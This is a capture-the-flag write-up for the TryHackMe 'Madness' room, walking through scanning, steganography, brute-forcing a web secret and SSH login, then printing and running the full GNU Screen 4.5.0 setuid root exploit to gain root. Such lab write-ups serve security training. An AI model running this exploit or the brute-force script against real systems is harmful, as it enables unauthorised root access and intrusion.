# Madness

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: Will you be consumed by Madness?
```
Room link: [https://tryhackme.com/r/room/madness](https://tryhackme.com/r/room/madness)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ nmap -v -sV -sC 10.10.143.14
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 17:37 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Initiating Ping Scan at 17:37
Scanning 10.10.143.14 [2 ports]
Completed Ping Scan at 17:37, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:37
Completed Parallel DNS resolution of 1 host. at 17:37, 0.00s elapsed
Initiating Connect Scan at 17:37
Scanning 10.10.143.14 [1000 ports]
Discovered open port 80/tcp on 10.10.143.14
Discovered open port 22/tcp on 10.10.143.14
Completed Connect Scan at 17:37, 0.65s elapsed (1000 total ports)
Initiating Service scan at 17:37
Scanning 2 services on 10.10.143.14
Completed Service scan at 17:37, 6.12s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.143.14.
Initiating NSE at 17:37
Completed NSE at 17:37, 1.47s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.18s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Nmap scan report for 10.10.143.14
Host is up (0.045s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:f9:85:10:52:65:6e:17:f5:1c:34:e7:d8:64:67:b1 (RSA)
|   256 dd:8e:5a:ec:b1:95:cd:dc:4d:01:b3:fe:5f:4e:12:c1 (ECDSA)
|_  256 e9:ed:e3:eb:58:77:3b:00:5e:3a:f5:24:d8:58:34:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Initiating NSE at 17:37
Completed NSE at 17:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.42 seconds
```
We have two services running:
- OpenSSH 7.2p2 on port 22
- Apache httpd 2.4.18 on port 80

### Manually examining the web site

Manually browsing to port 80 shows an `Apache2 Ubuntu Default Page`.

Looking more closely at the HTML-source we can find an interesting comment near a `thm.jpg` file
```html
      <div class="page_header floating_element">
        <img src="thm.jpg" class="floating_element"/>
<!-- They will never find me-->
        <span class="floating_element">
          Apache2 Ubuntu Default Page
        </span>
```

Trying to browse to the image only shows an error
```
The image "http://10.10.143.14/thm.jpg" cannot be displayed because it contains errors.
```
so we download it with `wget` instead
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ wget http://10.10.143.14/thm.jpg                                               
--2024-09-28 17:59:29--  http://10.10.143.14/thm.jpg
Connecting to 10.10.143.14:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 22210 (22K) [image/jpeg]
Saving to: ‘thm.jpg’

thm.jpg                                        100%[==================================================================================================>]  21.69K  --.-KB/s    in 0.04s   

2024-09-28 17:59:29 (547 KB/s) - ‘thm.jpg’ saved [22210/22210]
```

Checking the file with `xxd` shows a PNG header!?  
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ xxd -l 48 thm.jpg        
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203  .......C........
00000020: 0303 0304 0303 0405 0805 0504 0405 0a07  ................
```
What's going on? Is the header corrupted with a PNG header?

Checking [this list of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) we can see that the first 12 bytes should be `FF D8 FF E0 00 10 4A 46 49 46 00 01` in hexadecimal instead.

Let's fix it with `echo` and `dd`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ cp thm.jpg thm_fixed.jpg

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ echo -en '\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01' | dd of=thm_fixed.jpg bs=12 conv=notrunc
1+0 records in
1+0 records out
12 bytes copied, 0.000643678 s, 18.6 kB/s
```

Then we can view the fixed image with `eog`, `feh` or any other tool of our choice.

![Fixed image on Madness machine](Images/Fixed_image_on_Madness_machine.jpg)

Ah, there is a hidden directory called `/th1s_1s_h1dd3n`.

### Check the hidden directory

Browsing to the hidden directory (http://10.10.143.14/th1s_1s_h1dd3n/) shows a greeting
```
Welcome! I have been expecting you!

To obtain my identity you need to guess my secret! 
```
Checking the HTML-source further shows a useful comment
```
<!-- It's between 0-99 but I don't think anyone will look here-->
```
We ought to be able to brute-force the value of `secret`

### Brute-force the secret value

Let's write a small Python script with the [requests module](https://pypi.org/project/requests/) that brute-forces the value
```python
#!/usr/bin/python3

import requests

session = requests.session()

for secret in range(0, 100):
    url = f"http://10.10.143.14/th1s_1s_h1dd3n/?secret={secret}"
    req = session.post(url)
    if not "That is wrong!" in req.text:
        print(f"Correct secret is: {secret}")
        print(req.text)

session.close()
```

Then we run the script
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ chmod +x bf_secret.py   

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ ./bf_secret.py
Correct secret is: 73
<html>
<head>
  <title>Hidden Directory</title>
  <link href="stylesheet.css" rel="stylesheet" type="text/css">
</head>
<body>
  <div class="main">
<h2>Welcome! I have been expecting you!</h2>
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->

<p>Secret Entered: 73</p>

<p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>

</div>
</body>
</html>
```
The text `y2RPJ4QaPF!B` very much looks like a password!  

We can check if it is a password for `steghide`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ steghide extract -sf thm_fixed.jpg -p 'y2RPJ4QaPF!B'
wrote extracted data to "hidden.txt".

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ cat hidden.txt 
Fine you found the password! 

Here's a username 

wbxre

I didn't say I would make it easy for you!
```
Hhm, the username looks really strange. What if it is encoded?  
The room hint says `There's something ROTten about this guys name!`  
So let's try to decode it with ROT13
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ echo wbxre | rot13 
joker
```
That's makes more sense.

### Try to login with SSH as joker

Now that we have user credentials (`joker:y2RPJ4QaPF!B`) we ought to be able to login with SSH
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ ssh joker@10.10.143.14
joker@10.10.143.14's password: 
Permission denied, please try again.
joker@10.10.143.14's password: 
Permission denied, please try again.
joker@10.10.143.14's password: 
```
But no, that didn't work!

Here I got stuck for quite a while until I found a hint to use the image from the room (the file named `5iW7kC8.jpg`).

### Another steghide hidden file

Let's try `steghide` another time
```bash          
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ steghide extract -sf 5iW7kC8.jpg                  
Enter passphrase: 
wrote extracted data to "password.txt".

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ cat password.txt   
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

### Try to login with SSH again

Now we try to login again with updated credentials (`joker:*axA&GF8dP`)
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ ssh joker@10.10.143.14                            
joker@10.10.143.14's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$ 
```
And we are in!

### Get the user flag

Next, we can search for the user flag
```bash
joker@ubuntu:~$ ls -la
total 20
drwxr-xr-x 3 joker joker 4096 Sep 28 10:07 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Sep 28 10:07 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
joker@ubuntu:~$ cat user.txt 
THM{<REDACTED>}
joker@ubuntu:~$ 
```

### Enumeration

It's now time for enumeration and finding a way to escalate our privileges.  

First we check if we can run commands as `root` with `sudo`
```bash
joker@ubuntu:~$ sudo -l
[sudo] password for joker: 
Sorry, user joker may not run sudo on ubuntu.
```
But no. No such luck!

Next, we check for SUID binaries with `find`
```bash
joker@ubuntu:~$ find / -type f -perm /4000 2> /dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
```
What sticks out here are the two lines of `screen`.

We check for available exploits for that version
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ searchsploit screen 4.5.0
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                                           | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                                     | linux/local/41152.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ searchsploit -m 41154     
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Madness/41154.sh
```

Let's check the exploit more closely
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Madness]
└─$ cat 41154.sh                                     
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell 
```
It looks promising!

### Privilege escalation

Now we try it in our logged in session
```bash
joker@ubuntu:~$ cd /tmp
joker@ubuntu:/tmp$ vi exploit.sh
joker@ubuntu:/tmp$ chmod +x exploit.sh 
joker@ubuntu:/tmp$ ./exploit.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
# 
```
Excellent, we are root!

### Get the root flag

And finally, we get the root flag
```bash
# cd /root
# ls
root.txt
# cat root.txt
THM{<REDACTED>}
```

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [dd - Linux manual page](https://man7.org/linux/man-pages/man1/dd.1.html)
- [echo - Linux manual page](https://man7.org/linux/man-pages/man1/echo.1.html)
- [find - Linux manual page](https://man7.org/linux/man-pages/man1/find.1.html)
- [List of file signatures - Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [requests - PyPI Module](https://pypi.org/project/requests/)
- [ROT13 - Wikipedia](https://en.wikipedia.org/wiki/ROT13)
- [steghide - Homepage](https://steghide.sourceforge.net/)
- [steghide - Kali Tools](https://www.kali.org/tools/steghide/)
- [wget - Linux manual page](https://man7.org/linux/man-pages/man1/wget.1.html)
- [Setuid - Wikipedia](https://en.wikipedia.org/wiki/Setuid)
